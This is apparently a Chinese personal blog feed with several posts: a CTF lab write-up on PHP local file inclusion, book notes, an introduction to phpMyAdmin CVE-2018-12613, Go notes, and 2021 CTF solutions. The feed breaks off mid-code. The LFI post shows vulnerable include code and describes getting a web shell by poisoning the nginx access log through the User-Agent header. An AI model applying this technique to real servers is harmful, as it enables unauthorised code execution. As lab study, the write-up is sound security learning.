title="外网渗透"></a>外网渗透</h1><h2 id="Webug-4-0"><a href="#Webug-4-0" class="headerlink" title="Webug 4.0"></a>Webug 4.0</h2><h3 id="零、环境介绍"><a href="#零、环境介绍" class="headerlink" title="零、环境介绍"></a>零、环境介绍</h3><h1 id="BUUOJ——Basic"><a href="#BUUOJ——Basic" class="headerlink" title="BUUOJ——Basic"></a>BUUOJ——Basic</h1><h2 id="一、BUU-LFI-COURSE-1"><a href="#一、BUU-LFI-COURSE-1" class="headerlink" title="一、BUU LFI COURSE 1"></a>一、BUU LFI COURSE 1</h2><p><strong>什么是php的LFI</strong></p><blockquote><p>首先谈到lfi就要先知道常见的文件包含所需要有的函数，下面是一些常见的(<strong>注意:LFI是php所特有的应该是，就目前所学来看</strong>)</p><ol><li><p>include()                 //包含一些html模块文件</p></li><li><p>require()                 //包含一些数据库,配置文件</p></li><li><p>include_once()       //只调用一次包含文件,多次调用就会报错</p></li><li><p>require_once()</p></li></ol><p>当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，<strong>也都将作为PHP代码执行</strong>。</p><p><strong>include与require的区别在于:</strong></p><ol><li><p>include是当代码执行到它所在的行数是,它才会开始包含文件,并且如果文件加载错误,依然会向下执行代码。</p></li><li><p>require是只要当前程序执行它就会立刻包含文件,并且在加载文件错误的时候会停止运行并发出警告。</p></li></ol></blockquote><p>然后就是甚么是LFI了，刚开始打CTF的时候看到wp中所写的lfi，还是有点不知所然的。但是了解了一下知道原来就是简单的文件包含而已。。</p><blockquote><p><strong>文件包含漏洞的类型分为:</strong></p><ol><li>本地文件包含(LFI)</li><li>远程文件包含(RFI)</li></ol><p>当<strong>php.ini</strong>中，设置</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">></span>allow_url_include <span class="token operator">=</span> On<span class="token operator">></span>allow_url_fopen <span class="token operator">=</span> On<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>即可<strong>执行远程代码</strong>。</p></blockquote><p>然后就是说到这个本地文件包含了，这个在真实的渗透测试(黑盒)的过程中通常是十分难以发现的，因为条件十分的苛刻。首先后端的整体框架是要使用php的，然后又要判断到底是哪里可能是由文件包含常用的那几个函数，而且最重要的是，这个函数的参数对于我们来说必须是可控的，而这对于黑盒测试简直就是不可能的，所以一般使用LFI的时候面向的测试对象一般是需要白盒的。也就是LFI一般是白盒代码审计的时候会见得到，其他情况下是很少见的。</p><p>下面是zhao老师给出的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码的意思就是获得一个文件并且包含这个文件。这里的<code>$str</code>变量看似并没有使用上。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621140837246.png" alt></p><p>这里因为会将里面包含的文件的内容当成html文件，所以我们包含flag文件的时候应该是直接可以输出flag的。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621140948098.png" alt></p><p>当然获得flag并不是我们渗透测试的主要目的，这种最多算是个任意问价读取，还是要看看如何getshell。这里采取包含日志文件，在日志文件里面请求头里面插入恶意代码。</p><p>这里针对nginx这种专门的中间件可以包含下面的文件来getshell</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;包含日志文件&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621141916984.png" alt></p><p><strong>值得一提的是这里包含的access.log文件并不会包含到post的内容，只会包含请求的资源以及UA头。但是这对于我们getshell已经是够得不能再够了。</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621141735484.png" alt></p><p>可以看到浏览器自动高亮了，也就是说这里已经是可以执行了的。直接连上蚁剑获得该终端。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210621142213571.png" alt></p><p>本来上线之后第一件事就是想着要练练提权的，但是一看啥环境都没有，直接放弃了。</p><pre class="line-numbers language-none"><code class="language-none">(www-data:&#x2F;tmp) $ ls &#x2F;binarchashbase64bbconfigbusyboxcatchgrpchmodchownconspycpdatedddfdmesgdnsdomainnamedumpkmapechoedegrepfalsefatattrfdflushfgrepfsyncgetoptgrepgunzipgziphostnameioniceiostatipcalckbd_modekilllinklinux32linux64lnloginlslzopmakemimemkdirmknodmktempmoremountmountpointmpstatmvnetstatnicepidofpingping6pipe_progressprintenvpspwdreformimerevrmrmdirrun-partssedsetprivsetserialshsleepstatsttysusynctartouchtrueumountunameusleepwatchzcat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记总篇</title>
      <link href="2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/"/>
      <url>2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="技术类书籍"><a href="#技术类书籍" class="headerlink" title="技术类书籍"></a>技术类书籍</h1><p>技术类没怎么看过书，一般都是看大师傅们的博客来学习。</p><h1 id="小说类书籍"><a href="#小说类书籍" class="headerlink" title="小说类书籍"></a>小说类书籍</h1><h2 id="2021年"><a href="#2021年" class="headerlink" title="2021年"></a>2021年</h2><h3 id="文城-——余华"><a href="#文城-——余华" class="headerlink" title="文城  ——余华"></a>文城  ——余华</h3><ol><li>第一次读<code>2021年8月1日 — 2021年8月2日</code></li></ol><p><img src="/2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/image-20210802225140518.png" alt></p><p>​    感觉整篇小说应该算是悲剧吧，非专业的角度说，因为我喜欢的角色都死了，男女主角就是林祥福跟小美吧，也许是先入为主，我总感觉小美跟林祥福最配，后面写的补的内容更详细地站在了小美的角度讲述的故事让人更伤感了，还好我读的快，只用了四个小时左右的时间看完了整本书，到后面越来越快，补的那些内容我只用了一个小时左右的时间。</p><p>​    讲的故事呢，也很生动。像我这种读网络小说的屌丝看着都不费劲，比一些故意把文章写得晦涩难懂的好得多，嘿嘿。全篇文章描述最多的女性角色小美感觉特别好，真的特别好。</p><p>​    我也不会总结，也不会记录，索性就把现在想到的内容写下来就算了。</p><blockquote><p>车轮的声响远去时，田氏兄弟说话的声音也在远去，他们计算着日子，要在正月初一前把大哥和少爷送回家中。</p></blockquote><p>最后林祥福死后棺材经过小美与阿强埋身的地方更让人觉得难以呼吸。。。</p><h3 id="许三观卖血记-——余华"><a href="#许三观卖血记-——余华" class="headerlink" title="许三观卖血记 ——余华"></a>许三观卖血记 ——余华</h3><ol><li>第一次读完<code>2021年8月20日 00点31分</code></li></ol><p><img src="/2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/image-20210820002314269.png" alt></p><p>许三观卖血娶媳妇、养孩子、救急，凡是卖过血之后都要吃爆炒猪肝、二两黄酒(黄酒要温一温)，说实话我看不太懂，也没看到什么精髓的地方，纯粹是感觉文章写的还算有趣读下去的，我没什么深度。最膈应人的是到最后我也没弄清楚一乐到底是不是许三观的儿子。许三观很善良，就像之前读的文城中的林祥福一样的善良，也许是一样而非一种的善良，但都散发着人性的光辉，让人觉得可怜，触及人的同理心。不会总结，到此为止。许玉兰与许三观也算是”佳偶天成”。这篇文章的结局好过文城，文城读着太让人压抑。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE复现总刊</title>
      <link href="2021/06/01/CVE%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/01/CVE%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现一些近年来的cve学习一下</p><h1 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h1><h2 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h2><p><strong>TAG: 文件包含漏洞、PhpMyAdmin写入Shell</strong></p><p>因为phpmyadmin本身也是用php来写的，所以php的一些漏洞在phpmyadmin里面也是可能出现的，这里就是一个简单的文件包含漏洞。</p><blockquote><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。</p><p>该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。</p><p>攻击者必须经过身份验证，但在这些情况下除外：</p><ul><li>$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</li><li>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</li></ul></blockquote><p>就是说只要你可以登录这个版本的phpmyadmin的话，就都可以实现任意代码执行。下面看一下审计代码的过程。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>phpMyAdmin 4.8.0和4.8.1</p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习笔记</title>
      <link href="2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210530234831511.png" alt></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着技术的发展，好像说python越来越力不从心了。虽然python的语言格式十分简洁，代码也容易理解，本来我想做一个pythonista的来着，但是看群里都在讨论go语言这种新技术(对于我来说是新技术)，就想了解了解学一下看看go语言的优缺，看哪门语言更适合作为工具语言(语言被开发出来就是作为工具要用的)。PS：其实是总是听说go语言比python好(个人感觉就是好像在瞎吹一样)，想来看看到底好在哪里。</p><p><strong>主要在最近学习python开发之余学一学golang，现在的我也还没资格深入进去</strong></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>直接下个GoLand就行了，sdk这个ide会自己给你安装好的，也省得配置环境了，到现在为止还没有发现什么错误。社区版的应该就足够一般化的使用了。</p><h2 id="Go-是编译型语言"><a href="#Go-是编译型语言" class="headerlink" title="Go 是编译型语言"></a>Go 是编译型语言</h2><p>Go 使用编译器来编译代码。编译器将源代码编译成二进制（或字节码）格式；在编译代码时，编译器检查错误、优化性能并输出可在不同平台上运行的二进制文件。要创建并运行 Go 程序，程序员必须执行如下步骤。</p><ol><li>使用文本编辑器创建 Go 程序；</li><li>保存文件；</li><li>编译程序；</li><li>运行编译得到的可执行文件。</li></ol><p>这不同于 Python、Ruby 和 JavaScript 等语言，它们不包含编译步骤。Go 自带了编译器，因此无须单独安装编译器。</p><h2 id="Go特点"><a href="#Go特点" class="headerlink" title="Go特点"></a>Go特点</h2><p>快速编译，高效执行，易于开发。</p><p>Go语言支持交叉编译，比如说你可以在运行 Linux 系统的计算机上开发可以在 Windows 上运行的应用程序。这是第一门完全支持 UTF-8 的编程语言，这不仅体现在它可以处理使用 UTF-8 编码的字符串，就连它的源码文件格式都是使用的 UTF-8 编码。Go语言做到了真正的国际化！</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="Go语言中的变量"><a href="#Go语言中的变量" class="headerlink" title="Go语言中的变量"></a>Go语言中的变量</h2><h3 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h3><p>布尔类型：false</p><p>int类型  ：0</p><p>string类型：””</p><p>其他类型：nil</p><p>这里的其他类型官方文档给的解释是<code>Type must be a pointer, channel, func, interface, map, or slice type</code>。</p><p>也就是说必须是这六种类型<code>pointer, channel, func, interface, map, slice</code></p><h3 id="变量的声明"><a href="#变量的声明" class="headerlink" title="变量的声明"></a>变量的声明</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> i <span class="token builtin">int</span>    <span class="token keyword">var</span> f <span class="token builtin">float64</span>    <span class="token keyword">var</span> b <span class="token builtin">bool</span>    <span class="token keyword">var</span> s <span class="token builtin">string</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v %v %v %q\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> f<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>声明方式有下面的两种，即</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> value1 <span class="token keyword">type</span> <span class="token operator">=</span> value2  或   <span class="token keyword">var</span> value1 <span class="token operator">=</span> value2value1 <span class="token operator">:=</span> value2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是上面的语句都是声明语句，在变量的生存周期内，变量只能被声明一次，这时只能用赋值操作<code>=</code>来改变变量的值，千万不要以为<code>:=</code>是赋值语句，这个只是一个简写的声明语句而已。</p>]]></content>
      
      
      
        <tags>
            
            <tag> GoLang </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年各比赛wp</title>
      <link href="2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/"/>
      <url>2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="水平有限，大家包涵"><a href="#水平有限，大家包涵" class="headerlink" title="水平有限，大家包涵"></a>水平有限，大家包涵</h2><p>因为本人的时间与水平很有限(简言之就是菜得一批)，所以不能也没时间复现所有比赛的所有方向的所有题。所以这里只挑一些我参加的比赛做出来的题，以及之后有时间复现的题。</p><h2 id="记录内容"><a href="#记录内容" class="headerlink" title="记录内容"></a>记录内容</h2><p>记录了2021年各个比赛所做出题的wp，可能还会有复现的题目的wp。</p><h1 id="DozerCTF"><a href="#DozerCTF" class="headerlink" title="DozerCTF"></a>DozerCTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529192924991.png" alt="image-20210529192924991"></p><p>在视频中发现flag</p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">DozerCTF&#123;w3lc0me_to_Do2erCTF&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><h4 id="用到的在线网站"><a href="#用到的在线网站" class="headerlink" title="用到的在线网站"></a>用到的在线网站</h4><p><a href="https://it365.gitlab.io/zh-cn/gif-frames/?zlan">在线动图分帧工具</a></p><p><a href="http://cdn.malu.me/qrdecode/">在线二维码扫描工具</a></p><h4 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h4><p>可以发现图片里面藏着两个图片文件，一个GIF文件，另一个是一个没用的PNG文件。用上面的在线分帧软件将图片一帧一帧地分开。得到的二维码再一张一张地扫得下面的内容(因为二维码也不是特别多，没必要再写个脚本搞)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 得到的内容是zoDCre&#123;FT_si_timiselp</span>s <span class="token operator">=</span> <span class="token string">'zoDCre&#123;FT_si_timiselp'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># DozerCTF&#123;is_it_simple</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以感觉后面还是有东西的，估计东西就是在后面我以为没用的那个png文件中了。再扫描以下后面的二维码发现是一个零宽隐写，在线扫描一下。</p><p>得到的内容似乎是<code>我已经看见了，‎‏‏‍‏‍‌‏‍‏‎‏‏‏‌‏‍‌‏‎‍‌‌‎‎‏‏‏‍‌‏‍‏‎‏‍‏‎‏‍‏‎‌‏‎‍‏‌‎‎‏‍‏‎‌‏‌‌你呢？</code>，零宽之后得到的内容是<code>tntentinttteteteee</code>，往下没做动。</p><h1 id="DASCTF-X-BUU"><a href="#DASCTF-X-BUU" class="headerlink" title="DASCTF X BUU"></a>DASCTF X BUU</h1><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/banner_1.png" alt="比赛banner"></p><h2 id="赛事介绍"><a href="#赛事介绍" class="headerlink" title="赛事介绍"></a>赛事介绍</h2><p>DASCTF，由杭州安恒信息网络空间安全学院主办，是面向所有网络安全爱好者举办的职业技能大赛，为优秀参赛选手提供相关职业实习机会；为热衷于竞赛的网络安全爱好者提供竞赛平台；为大赛挑选强劲战队，增加决赛获奖难度与竞赛乐趣；为用人单位选拔优质人才。 通过比赛形式，挖掘网络安全人才，提升网络安全建设能力，增强我国网络安全防御能力。 2021年，DASCTF与高校、战队合作，共举办6场竞赛，合作方包括海南大学、贵州大学、榆林学院、浙江农林大学、公大、国内知名CTF联盟BJD、国内知名战队NepNep、国内知名战队天璇Merak、国内知名战队V&amp;N，每场竞赛参与人数均在1500+，赛后调研好评率高达95%以上。</p><h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>flag{welcome_to_dasctf_may}</p><h3 id="Holmes"><a href="#Holmes" class="headerlink" title="Holmes"></a>Holmes</h3><p>一张图片，winhex打开发现后面是rar压缩包文件，然后分离压缩包，图片上跳舞的小人密码解出来压缩包的密钥为<code>YOYARHHOLMES</code>，根据那两个颜色稍显重一点的内容猜测那两位字符可能是需要猜的，所以口令就是<code>YOUAREHOLMES</code></p><p>解压出的python文件的内容为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">"flag&#123;********************************&#125;"</span>encflag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    encflag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79,76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单逆向一下得flag为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">encflag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>encflag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag&#123;46a4b3357e13f0755a42651250633038</span><span class="token comment"># flag&#123;46a4b3357e13f0755a42651250633038&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="rickroll-u"><a href="#rickroll-u" class="headerlink" title="rickroll_u"></a>rickroll_u</h3><p>明文攻击得口令为<code>t!m32R1</code></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529110002150.png" alt="明文攻击"></p><p>解压之后获得一段wav音频文件。</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="PaperPlease"><a href="#PaperPlease" class="headerlink" title="PaperPlease"></a>PaperPlease</h3><p>题目描述：简单的字符串解密</p><p>确实只是一段简单的逆向，给出的变换后的字符串的内容为<code>DASCTF&#123;5c715207e3abed7dfb7c8ea9c82d0e29&#125;</code></p><p>主要负责变换字符串的部分的代码的逆向内容为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">subfhsadkhjbfleiowiuoyfgshjdvbsmnakl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-24h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>dest<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-20h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>  dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dest<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token 